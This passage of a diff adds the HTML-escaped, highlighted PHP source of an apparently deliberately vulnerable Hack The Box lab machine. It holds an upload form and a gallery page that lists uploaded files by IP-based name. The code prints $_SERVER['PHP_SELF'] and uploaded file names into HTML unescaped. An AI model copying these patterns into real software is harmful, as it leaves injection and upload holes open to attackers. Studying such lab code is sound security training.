+      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;displayform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'PHP_SELF'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;enctype=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;multipart/form-data&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+ &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;myFile&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+ &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;go!&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;photos.php&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;style &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nc&quot;&gt;.tg&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;border-collapse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;collapse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;border-spacing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;margin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0px&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;auto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;
+&lt;span class=&quot;nc&quot;&gt;.tg&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;td&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;14px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;10px&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;5px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;border-style&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;solid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;border-width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;overflow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hidden&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;word-break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;normal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;border-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;
+&lt;span class=&quot;nc&quot;&gt;.tg&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;14px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-weight&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;normal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;10px&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;5px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;border-style&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;solid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;border-width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;overflow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hidden&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;word-break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;normal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;border-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;
+&lt;span class=&quot;nc&quot;&gt;.tg&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;.tg-0lax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;text-align&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;vertical-align&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;@media&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;screen&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max-width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;767px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;.tg&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;!important&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;.tg&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;col&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;!important&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;.tg-wrap&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;overflow-x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;auto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;-webkit-overflow-scrolling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;touch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;margin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+Welcome to our awesome gallery!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/br&amp;gt;&lt;/span&gt;
+See recent uploaded pictures from our community, and feel free to rate or comment&lt;span class=&quot;nt&quot;&gt;&amp;lt;/br&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/var/www/html/lib.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/var/www/html/uploads/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ignored&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'..'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'index.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$files&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;div class=&quot;tg-wrap&quot;&amp;gt;&amp;lt;table class=&quot;tg&quot;&amp;gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;scandir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ignored&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;filemtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;arsort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$files&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_keys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$files&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$exploded&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$prefix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$exploded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$check&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;check_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$prefix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// for HTB, to avoid too many spoilers
+&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strpos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$exploded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'10_10_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$prefix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REMOTE_ADDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;tr&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;td class=&quot;tg-0lax&quot;&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;uploaded by &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$check[1]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;img src='uploads/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;' width=100px&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/td&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/tr&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/tr&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
